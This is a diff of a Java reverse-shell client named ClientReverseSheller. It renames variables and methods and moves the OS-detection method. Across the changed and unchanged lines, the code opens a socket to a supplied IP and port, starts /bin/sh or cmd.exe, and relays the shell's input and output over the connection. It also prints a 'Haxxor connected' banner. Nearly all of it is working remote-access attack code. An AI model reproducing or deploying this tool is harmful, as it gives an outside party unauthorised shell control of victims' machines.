@@ -24,7 +24,7 @@ public class ClientReverseSheller {
         this.inetServerSocket = new InetSocketAddress(ipAddress, port);
     }
 
-    public static void main(String[] args) throws IOException {
+    public static void main(String[] args) {
 
         System.out.println();
         System.out.print("8 8888        8          .8.          `8.`8888.      ,8' `8.`8888.      ,8'  ,o888888o.     8 888888888o.\n");
@@ -75,9 +75,9 @@ public class ClientReverseSheller {
     private void connect() {
 
         detectOperatingSystem();
-        OutputStream remoteStdin = null;
-        InputStream remoteStdout = null;
-        InputStream remoteStderr = null;
+        OutputStream clientStdin = null;
+        InputStream clientStdout = null;
+        InputStream clientStderr = null;
         InputStream clientSocketInput = null;
         OutputStream clientSocketOutput = null;
 
@@ -86,27 +86,27 @@ public class ClientReverseSheller {
             clientSocket.setSoTimeout(100);
             clientSocket.connect(inetServerSocket);
 
-            Process remoteShell = new ProcessBuilder(this.detectedShell).redirectInput(ProcessBuilder.Redirect.PIPE)
+            Process clientShell = new ProcessBuilder(this.detectedShell).redirectInput(ProcessBuilder.Redirect.PIPE)
                     .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
             System.out.println("Haxxor connected “ψ (｀∇´) ψ ... ◥(ฅº￦ºฅ)◤ ...\n");
 
-            remoteStdin = remoteShell.getOutputStream();
-            remoteStdout = remoteShell.getInputStream();
-            remoteStderr = remoteShell.getErrorStream();
+            clientStdin = clientShell.getOutputStream();
+            clientStdout = clientShell.getInputStream();
+            clientStderr = clientShell.getErrorStream();
             clientSocketInput = clientSocket.getInputStream();
             clientSocketOutput = clientSocket.getOutputStream();
 
             do {
-                if (!remoteShell.isAlive()) {
+                if (!clientShell.isAlive()) {
                     System.out.println("Remote shell has been terminated\n\n");
                     break;
                 }
-                this.readRemoteShell(clientSocketInput, remoteStdin, "SOCKET", "STDIN");
-                if (remoteStderr.available() > 0) {
-                    this.readRemoteShell(remoteStderr, clientSocketOutput, "STDERR", "SOCKET");
+                this.sendInputToOutput(clientSocketInput, clientStdin, "SOCKET", "STDIN");
+                if (clientStderr.available() > 0) {
+                    this.sendInputToOutput(clientStderr, clientSocketOutput, "STDERR", "SOCKET");
                 }
-                if (remoteStdout.available() > 0) {
-                    this.readRemoteShell(remoteStdout, clientSocketOutput, "STDOUT", "SOCKET");
+                if (clientStdout.available() > 0) {
+                    this.sendInputToOutput(clientStdout, clientSocketOutput, "STDOUT", "SOCKET");
                 }
             } while (!this.error);
             System.out.println("EXIT");
@@ -114,9 +114,9 @@ public class ClientReverseSheller {
             System.out.println("ERROR: " + e.getMessage());
         } finally {
             try {
-                Objects.requireNonNull(remoteStdin).close();
-                Objects.requireNonNull(remoteStdout).close();
-                Objects.requireNonNull(remoteStderr).close();
+                Objects.requireNonNull(clientStdin).close();
+                Objects.requireNonNull(clientStdout).close();
+                Objects.requireNonNull(clientStderr).close();
                 Objects.requireNonNull(clientSocketInput).close();
                 Objects.requireNonNull(clientSocketOutput).close();
             } catch (IOException ignored) {
@@ -124,25 +124,9 @@ public class ClientReverseSheller {
         }
     }
 
-    private void detectOperatingSystem() {
+    private void sendInputToOutput(InputStream input, OutputStream output, String inputName, String outputName) {
 
-        boolean detected = true;
-        this.detectedOs = System.getProperty("os.name").toUpperCase();
-        if (this.detectedOs.contains("LINUX") || this.detectedOs.contains("MAC")) {
-            this.detectedOs = "LINUX";
-            this.detectedShell = "/bin/sh";
-        } else if (this.detectedOs.contains("WIN")) {
-            this.detectedOs = "WINDOWS";
-            this.detectedShell = "cmd.exe";
-        } else {
-            detected = false;
-            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
-        }
-    }
-
-    private void readRemoteShell(InputStream input, OutputStream output, String inputName, String outputName) {
-
-        int bytes = 0;
+        int bytes;
         try {
             do {
                 if (this.detectedOs.equals("WINDOWS") && inputName.equals("STDOUT") && this.charLen > 0) {
@@ -168,6 +152,20 @@ public class ClientReverseSheller {
         } catch (IOException ex) {
             this.error = true;
             System.out.println("STRM_ERROR: Cannot write to: " + outputName + ", or read from: " + inputName);
+        }
+    }
+
+    private void detectOperatingSystem() {
+
+        this.detectedOs = System.getProperty("os.name").toUpperCase();
+        if (this.detectedOs.contains("LINUX") || this.detectedOs.contains("MAC")) {
+            this.detectedOs = "LINUX";
+            this.detectedShell = "/bin/sh";
+        } else if (this.detectedOs.contains("WIN")) {
+            this.detectedOs = "WINDOWS";
+            this.detectedShell = "cmd.exe";
+        } else {
+            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
         }
     }
 }
